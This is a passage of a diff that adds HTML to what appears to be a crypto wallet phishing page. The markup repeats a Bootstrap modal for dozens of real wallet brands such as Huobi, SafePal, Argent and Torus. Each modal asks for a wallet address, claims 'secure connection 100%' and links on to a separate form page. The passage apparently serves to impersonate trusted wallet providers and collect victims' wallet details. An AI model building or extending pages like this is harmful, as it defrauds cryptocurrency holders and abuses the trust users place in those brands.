+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/5a96d19c-93d3-4e6a-624a-16f52773d000/lg" alt="" />
+                            <h4>Huobi</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal26" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpeg" alt="" />
+                            <h4>Eidoo</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal27" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/2972bbf8-0891-414a-f63c-8d3bcf661d00/lg" alt="" />
+                            <h4>Loopring</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal29" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal30" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpeg" alt="" />
+                            <h4>TrustVault</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal30" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal31" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpeg" alt="" />
+                            <h4>Atomic</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal31" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal32" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpeg" alt="" />
+                            <h4>Coin98</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal32" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal33" class="btn coin">
+                            <img class="coin-img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png" alt="" />
+                            <h4>Tron</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal33" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal34" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpeg" alt="" />
+                            <h4>Alice</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal34" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" alt="" />
+                            <h4>AlphaWallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal35" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal36" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpeg" alt="" />
+                            <h4>D'CENT</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal36" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal37" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpeg" alt="" />
+                            <h4>ZelCore</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal37" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/12f981b1-bb0a-4115-009f-317255979600/lg" alt="" />
+                            <h4>Nash</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal38" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal39" class="btn coin">
+                            <img class="coin-img" src="https://www.coinomi.com/svg/coinomi-mark-color.svg" alt="" />
+                            <h4>Coinmoni</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal39" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpeg" alt="" />
+                            <h4>GridPlus</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal40" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpeg" alt="" />
+                            <h4>CYBAVO</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal41" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal42" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpeg" alt="" />
+                            <h4>Tokenary</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal42" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpeg" alt="" />
+                            <h4>Torus</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal43" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal44" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpeg" alt="" />
+                            <h4>Spatium</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal44" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal45" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg" alt="" />
+                            <h4>SafePal</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal45" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal46" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpeg" alt="" />
+                            <h4>Infinito</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal46" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpeg" alt="" />
+                            <h4>wallet.io</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal47" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal48" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpeg" alt="" />
+                            <h4>Ownbit</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal48" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal50" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpeg" alt="" />
+                            <h4>Bridge Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal50" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpeg" alt="" />
+                            <h4>Spark Point</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal51" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal52" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpeg" alt="" />
+                            <h4>ViaWallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal52" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" alt="" />
+                            <h4>Argent</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal53" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpeg" alt="" />
+                            <h4>Vision</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal54" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal55" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpeg" alt="" />
+                            <h4>PEAKDEFI</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal55" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
